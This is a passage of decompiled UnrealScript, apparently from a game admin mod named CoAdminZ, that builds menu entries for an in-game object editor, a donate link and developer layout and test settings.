            MenuCategories[X].Help[i] = "You need to be logged in as administrator to use this.";
            MenuCategories[X].propertyName[i] = "command";
            MenuCategories[X].Value[i] = "adminlogin";
            MenuCategories[X].count = i;            
        }
        else
        {
            if(!Owner.bCheatsEnabled)
            {
                MenuCategories[X].stcProperty[i] = "<-";
                MenuCategories[X].propertyName[i] = "";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Enable cheats";
                MenuCategories[X].Help[i] = "You need to enable cheats to use this.";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "cheatplease";
                MenuCategories[X].count = i;                
            }
            else
            {
                MenuCategories[X].stcProperty[i] = "Auto select";
                MenuCategories[X].Help[i] = "Toggles automatic selection of newest object you spawned";
                MenuCategories[X].propertyName[i] = "bAutoSelect";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Highlight object";
                MenuCategories[X].Help[i] = "Toggles highlighting the selected object ( stow your weapon to see it )";
                MenuCategories[X].propertyName[i] = "bHighlightSelected";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Object";
                MenuCategories[X].Help[i] = "Select the object you want to edit";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Value[i] = "selectedObjectID";
                MenuCategories[X].maxValue[i] = 63;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Select closest object";
                MenuCategories[X].Help[i] = "Selects the closest object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "closestobject";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Select closest pickup";
                MenuCategories[X].Help[i] = "Selects the closest pickup ( food / inventory / runes )";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "closestpickup";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Select closest particles";
                MenuCategories[X].Help[i] = "Selects the closest particlesystem (fire etc)";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "closestparticle";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Select closest effect";
                MenuCategories[X].Help[i] = "Selects the closest effect ( blastglow etc. )";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "closesteffect";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Select closest trigger/mover";
                MenuCategories[X].Help[i] = "Selects the closest trigger/mover";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "closesttrigger";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Select info actor";
                MenuCategories[X].Help[i] = "Selects the closest info actor";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "closestinfo";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Select closest pawn";
                MenuCategories[X].Help[i] = "Selects the closest pawn ( players,creatures etc. ) (MIGHT CRASH YOUR GAME)";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "closestpawn";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Select yourself";
                MenuCategories[X].Help[i] = "Edit your own player (MIGHT CRASH YOUR GAME)";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "selectme";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Output Loc/Rot";
                MenuCategories[X].Help[i] = "get exact location&rotation for scripting or mapping";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "getlocrot";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Delete";
                MenuCategories[X].Help[i] = "Deletes selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "delete";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Duplicate";
                MenuCategories[X].Help[i] = "Duplicates selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "duplicate";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test mode";
                MenuCategories[X].Help[i] = "Toggles test modes";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "toggletest";
                i = i + 1;
                if(((INT_v6439 == 1) && A_v6593 != none) && A_v6593.Skeletal != none)
                {
                    Local_int_v0 = 0;
                    J0x8918:

                    if(Local_int_v0 < 16)
                    {
                        MenuCategories[X].controlStyle[i] = 1;
                        MenuCategories[X].stcProperty[i] = ("SkelGroupFlag[" $ string(Local_int_v0)) $ "]";
                        MenuCategories[X].Help[i] = "Modify skelgroupflag " $ string(Local_int_v0);
                        MenuCategories[X].propertyName[i] = "command";
                        MenuCategories[X].Value[i] = "skelFlag " $ string(Local_int_v0);
                        i = i + 1;
                        Local_int_v0++;
                        // [Loop Continue]
                        goto J0x8918;
                    }
                }
                if((INT_v6439 == 2) && A_v6593 != none)
                {
                    MenuCategories[X].controlStyle[i] = 0;
                    MenuCategories[X].Help[i] = "Adjust the value which is used to adjust the joint velocity";
                    MenuCategories[X].stcProperty[i] = "Joint velocity modifier";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "jointAdd";
                    MenuCategories[X].maxValue[i] = 10000;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].controlStyle[i] = 0;
                    MenuCategories[X].stcProperty[i] = "Selected joint";
                    MenuCategories[X].Help[i] = ("Select the joint you want to modify(" $ A_v6593.GetJointName(whichJoint)) $ ")";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "whichJoint";
                    MenuCategories[X].maxValue[i] = 50;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 1.0000000;
                    i = i + 1;
                    MenuCategories[X].controlStyle[i] = 0;
                    MenuCategories[X].stcProperty[i] = "Manual Inc/Dec";
                    MenuCategories[X].Help[i] = "Modify selected jointflag manually, decreases/increases by 1 to allow multiple flags";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].Value[i] = "jointMan";
                    i = i + 1;
                    MenuCategories[X].controlStyle[i] = 0;
                    MenuCategories[X].stcProperty[i] = "Modify X Velocity";
                    MenuCategories[X].Help[i] = "Modifies X Velocity of selected joint";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].Value[i] = "jointX";
                    i = i + 1;
                    MenuCategories[X].controlStyle[i] = 0;
                    MenuCategories[X].stcProperty[i] = "Modify Y Velocity";
                    MenuCategories[X].Help[i] = "Modifies Y Velocity of selected joint";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].Value[i] = "jointY";
                    i = i + 1;
                    MenuCategories[X].controlStyle[i] = 0;
                    MenuCategories[X].stcProperty[i] = "Modify Z Velocity";
                    MenuCategories[X].Help[i] = "Modifies Z Velocity of selected joint";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].Value[i] = "jointZ";
                    i = i + 1;
                    Local_int_v0 = 0;
                    J0x8FEF:

                    if(Local_int_v0 < 37)
                    {
                        MenuCategories[X].controlStyle[i] = 1;
                        MenuCategories[X].stcProperty[i] = ("Jointflag[" $ string(Local_int_v0)) $ "]";
                        MenuCategories[X].Help[i] = "Modify Jointflag " $ string(Local_int_v0);
                        MenuCategories[X].propertyName[i] = "command";
                        MenuCategories[X].Value[i] = "jointFlag " $ string(Local_int_v0);
                        i = i + 1;
                        Local_int_v0++;
                        // [Loop Continue]
                        goto J0x8FEF;
                    }
                }
                if((bool(Trigger(A_v6593)) || bool(Mover(A_v6593))) || bool(Polyobj(A_v6593)))
                {
                    MenuCategories[X].stcProperty[i] = "Name";
                    MenuCategories[X].controlStyle[i] = 1;
                    MenuCategories[X].Help[i] = "Shows name(tag) of selected trigger/mover";
                    MenuCategories[X].propertyName[i] = "";
                    MenuCategories[X].Value[i] = "";
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Event";
                    MenuCategories[X].controlStyle[i] = 1;
                    MenuCategories[X].Help[i] = "Shows event of selected trigger/mover";
                    MenuCategories[X].propertyName[i] = "";
                    MenuCategories[X].Value[i] = "";
                    i = i + 1;
                }
                if(bool(DecorationRune(A_v6593)))
                {
                    MenuCategories[X].stcProperty[i] = "Destroyable";
                    MenuCategories[X].Help[i] = "Toggles bDestroyAble ";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].controlStyle[i] = 1;
                    MenuCategories[X].Value[i] = "destroyable";
                    i = i + 1;
                }
                if(INT_v6439 == 1)
                {
                    MenuCategories[X].stcProperty[i] = "Static";
                    MenuCategories[X].Help[i] = "- ";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].controlStyle[i] = 1;
                    MenuCategories[X].Value[i] = "bstatic";
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "NoDelete";
                    MenuCategories[X].Help[i] = " -";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].controlStyle[i] = 1;
                    MenuCategories[X].Value[i] = "bnodelete";
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Stasis";
                    MenuCategories[X].Help[i] = " -";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].controlStyle[i] = 1;
                    MenuCategories[X].Value[i] = "bstasis";
                    i = i + 1;
                }
                MenuCategories[X].stcProperty[i] = "DrawScale";
                MenuCategories[X].Help[i] = "Adjust drawscale of selected object by factor 0.1";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Value[i] = "drawscale";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "AlphaScale";
                MenuCategories[X].Help[i] = "Adjust alphascale (set style to alphablend)";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Value[i] = "alphascale";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Collision Height";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Help[i] = "Adjust the collision height of the selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "collisionheight";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Collision Radius";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Help[i] = "Adjust the collision radius of the selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "collisionradius";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Fatness";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Help[i] = "Adjust the fatness of the selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "fatness";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Draw style";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Help[i] = "Select drawing style of the selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "style";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Rotation Degree";
                MenuCategories[X].controlStyle[i] = 0;
                MenuCategories[X].Help[i] = "Set the degree which is used to adjust the rotation";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "rotIncDec";
                MenuCategories[X].maxValue[i] = 360;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Rotate (Pitch)";
                MenuCategories[X].controlStyle[i] = 0;
                MenuCategories[X].Help[i] = "Adjust the rotation pitch of selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "rotate pitch";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Rotate (Yaw)";
                MenuCategories[X].controlStyle[i] = 0;
                MenuCategories[X].Help[i] = "Adjust the rotation yaw of selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "rotate yaw";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Rotate (Roll)";
                MenuCategories[X].controlStyle[i] = 0;
                MenuCategories[X].Help[i] = "Adjust the rotation roll of selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "rotate roll";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Position Inc/Dec";
                MenuCategories[X].controlStyle[i] = 0;
                MenuCategories[X].Help[i] = "Adjust the value which is used to adjust the position";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "posIncDec";
                MenuCategories[X].maxValue[i] = 100;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Position (X)";
                MenuCategories[X].controlStyle[i] = 0;
                MenuCategories[X].Help[i] = "Adjust the x position of selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "position x";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Position (Y)";
                MenuCategories[X].controlStyle[i] = 0;
                MenuCategories[X].Help[i] = "Adjust the y position of selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "position y";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Position (Z)";
                MenuCategories[X].controlStyle[i] = 0;
                MenuCategories[X].Help[i] = "Adjust the z position of selected object";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "position z";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Color (R)";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Help[i] = "Adjust the color R of selected object ";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "color r";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Color (G)";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Help[i] = "Adjust the color G of selected object ";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "color g";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Color (B)";
                MenuCategories[X].controlStyle[i] = 1;
                MenuCategories[X].Help[i] = "Adjust the color B of selected object ";
                MenuCategories[X].propertyName[i] = "command";
                MenuCategories[X].Value[i] = "color b";
                MenuCategories[X].count = i;
            }
        }
    }
    if(gI == 11)
    {
        i = 0;
        if(devSettings == 0)
        {
            MenuCategories[X].stcProperty[i] = "<-";
            MenuCategories[X].propertyName[i] = "";
            MenuCategories[X].Value[i] = "/";
            i = i + 1;
            MenuCategories[X].stcProperty[i] = "Donate $$$";
            MenuCategories[X].Help[i] = "Opens the paypal page where you can support CoAdminZ with $$$";
            MenuCategories[X].controlStyle[i] = 1;
            MenuCategories[X].propertyName[i] = "command";
            MenuCategories[X].Value[i] = "donate";            
        }
        else
        {
            if(devSettings == 2)
            {
                MenuCategories[X].stcProperty[i] = "Killfeed test";
                MenuCategories[X].Help[i] = "dfghdhdfh";
                MenuCategories[X].propertyName[i] = "bKillfeed";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "custom font";
                MenuCategories[X].Help[i] = "dfghdhdfh";
                MenuCategories[X].propertyName[i] = "blargefeed";
                MenuCategories[X].Value[i] = "/";
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Font ID";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testfont2";
                MenuCategories[X].maxValue[i] = 11;
                MenuCategories[X].minValue[i] = 0;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "ICO Gap";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testicongap";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = -500;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "ICO Scale";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testIconScale";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 0.0025000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "ICO X";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "wooshOffsetX";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 0.0001000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "ICO Y";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "wooshOffsetY";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 0.0001000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 1";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat1";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 2";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat2";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 3";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat3";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = -500;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 4";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat4";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 5";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat5";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 6";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat6";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = -500;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 7";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat7";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = -500;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 8";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat8";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = -500;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 9";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat9";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = -500;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Float 10";
                MenuCategories[X].propertyName[i] = "float";
                MenuCategories[X].Value[i] = "testfloat10";
                MenuCategories[X].maxValue[i] = 500;
                MenuCategories[X].minValue[i] = -500;
                MenuCategories[X].stepValue[i] = 0.0100000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 1";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint1";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 2";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint2";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 3";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint3";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 4";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint4";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 5";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint5";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 6";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint6";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 7";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint7";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 8";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint8";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 9";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint9";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;
                i = i + 1;
                MenuCategories[X].stcProperty[i] = "Test Int 10";
                MenuCategories[X].propertyName[i] = "int";
                MenuCategories[X].Value[i] = "testint10";
                MenuCategories[X].maxValue[i] = 5000;
                MenuCategories[X].minValue[i] = -5000;
                MenuCategories[X].stepValue[i] = 1.0000000;                
            }
            else
            {
                if(devSettings == 1)
                {
                    MenuCategories[X].stcProperty[i] = "<-";
                    MenuCategories[X].propertyName[i] = "";
                    MenuCategories[X].Value[i] = "/";
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Debug messages";
                    MenuCategories[X].propertyName[i] = "bDebug";
                    MenuCategories[X].Value[i] = "/";
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu Position X";
                    MenuCategories[X].Help[i] = "Customize horizontal position of this menu";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "horizontalModifier";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 1.0000000;
                    MenuCategories[X].count = i;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. Bg. alpha";
                    MenuCategories[X].propertyName[i] = "float";
                    MenuCategories[X].Value[i] = "categoryAlpha";
                    MenuCategories[X].maxValue[i] = 1;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 0.0500000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. Bg. color R";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "bR";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. Bg. color G";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "bG";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. Bg. color B";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "bB";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. min. bg height";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "categoryHeightMin";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. bg height";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "categoryHeight";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. bg width";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "categoryWidth";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. bg Y";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "catY";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 1.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Cat. Gap";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "categoryGap";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 1.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu Bg. alpha";
                    MenuCategories[X].propertyName[i] = "float";
                    MenuCategories[X].Value[i] = "menuAlpha";
                    MenuCategories[X].maxValue[i] = 1;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 0.0500000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu Bg. color R";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "mR";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu Bg. color G";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "mG";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu Bg. color B";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "mB";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu bg height";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "menuHeight";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu bg width";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "menuWidth";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu dist.";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "menuDist";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu var. dist.";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "functionDist";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Menu Gap";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "menuGap";
                    MenuCategories[X].maxValue[i] = 1000;
                    MenuCategories[X].minValue[i] = -1000;
                    MenuCategories[X].stepValue[i] = 1.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Select Bigger Font";
                    MenuCategories[X].propertyName[i] = "bigfontmenu";
                    MenuCategories[X].Value[i] = "/";
                    i = i + 1;
                    if(bigFontMenu)
                    {
